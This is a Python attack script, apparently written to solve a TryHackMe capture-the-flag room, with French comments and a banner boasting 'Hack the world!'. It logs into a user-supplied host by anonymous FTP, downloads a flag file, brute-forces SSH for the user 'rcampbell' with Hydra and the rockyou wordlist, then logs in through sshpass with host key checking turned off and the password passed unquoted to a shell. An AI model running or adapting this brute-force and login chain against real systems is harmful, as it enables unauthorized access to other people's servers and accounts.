import os
import subprocess
from ftplib import FTP
import re

def clear_terminal():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def print_banner():
    banner = """
    \033[1;31m████████╗██████╗ ██╗██████╗ ███████╗ ██████╗  ██████╗███████╗██████╗ 
    ██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔════╝ ██╔════╝██╔════╝██╔══██╗
    ███████╗██████╔╝██║██████╔╝█████╗  ██║  ███╗███████╗█████╗  ██████╔╝
    ╚════██║██╔═══╝ ██║██╔══██╗██╔══╝  ██║   ██║╚════██║██╔══╝  ██╔══██╗
    ███████║██║     ██║██████╔╝███████╗╚██████╔╝███████║███████╗██║  ██║
    ╚══════╝╚═╝     ╚═╝╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
    \033[0m
    """

    print(banner)
    print("\033[1;31mMade by Flame44 & chat GPT3.5, ( i swear, i want kill him)\033[0m")
    print("\033[1;31mOur unique goal: Hack the world!\033[0m")
    print("\033[1;31mFuck Blackdevil\033[0m")
    print()

def connect_ftp(host):
    ftp = FTP(host)
    ftp.login('anonymous', 'anonymous')
    return ftp

def get_current_directory(ftp):
    current_directory = ftp.pwd()
    print(f"[*] Répertoire courant : {current_directory}")
    return current_directory

def list_files(ftp):
    ftp.retrlines('LIST')

def download_flag(ftp, current_directory):
    file_path = current_directory + '/.flag'
    local_file_path = '.flag'
    with open(local_file_path, 'wb') as file:
        ftp.retrbinary('RETR ' + file_path, file.write)
    print(f"[+] Fichier .flag téléchargé avec succès : {local_file_path}")

def disconnect_ftp(ftp):
    ftp.quit()
    print("[*] Déconnexion du serveur FTP.")

def clear_output_file(output_file_path):
    with open(output_file_path, 'w') as output_file:
        output_file.write('')

def run_hydra(hydra_command, output_file_path):
    hydra_process = subprocess.Popen(hydra_command, shell=True, stdout=subprocess.PIPE)
    found_passwords = []
    for line in iter(hydra_process.stdout.readline, b''):
        output = line.decode().strip()
        print(output)
        if "1 of 1 target successfully" in output:
            password = output.split(":")[-1].strip()
            print(f"[+] Mot de passe SSH trouvé : {password}")
            found_passwords.append(password)
    if found_passwords:
        password_file_path = '/home/kali/tryhackme/hacker/password.txt'
        with open(password_file_path, 'w') as password_file:
            for password in found_passwords:
                password_file.write(password + "\n")
        print(f"[+] Mots de passe ajoutés au fichier : {password_file_path}")

def extract_password(file_path):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    last_line = lines[-1]
    password_match = re.search(r'password: (.+)$', last_line)
    if password_match:
        password = password_match.group(1)
        return password.strip()
    return None

def connect_ssh(username, hostname, password):
    ssh_command = f"sshpass -p {password} ssh -o StrictHostKeyChecking=no {username}@{hostname}"
    subprocess.run(ssh_command, shell=True)

def main():
    clear_terminal()
    print_banner()

    # Demander à l'utilisateur de saisir l'adresse IP cible
    host = input(" \033[1;31mEntrez l'adresse IP du serveur FTP cible : \033[0m ")

    # Connexion FTP
    ftp = connect_ftp(host)

    # Récupération du répertoire courant
    current_directory = get_current_directory(ftp)

    # Lister les fichiers dans le répertoire courant
    list_files(ftp)

    # Téléchargement du fichier .flag
    download_flag(ftp, current_directory)

    # Déconnexion FTP
    disconnect_ftp(ftp)

    # Chemin vers le fichier hydra_output.txt
    output_file_path = '/home/kali/tryhackme/hacker/hydra_output.txt'

    # Vider le contenu du fichier hydra_output.txt
    clear_output_file(output_file_path)

    # Lancer la commande Hydra
    hydra_command = f"hydra -t 64 -l rcampbell -P /usr/share/wordlists/rockyou.txt -o {output_file_path} -W -t ssh://{host}/"
    run_hydra(hydra_command, output_file_path)

    # Extraction du mot de passe
    password = extract_password(output_file_path)

    if password:
        print(f"Mot de passe extrait : {password}")

        # Informations de connexion SSH
        username = "rcampbell"
        hostname = host

        # Connexion SSH
        connect_ssh(username, hostname, password)
    else:
        print("Aucun mot de passe trouvé dans le fichier.")

if __name__ == "__main__":
    main()
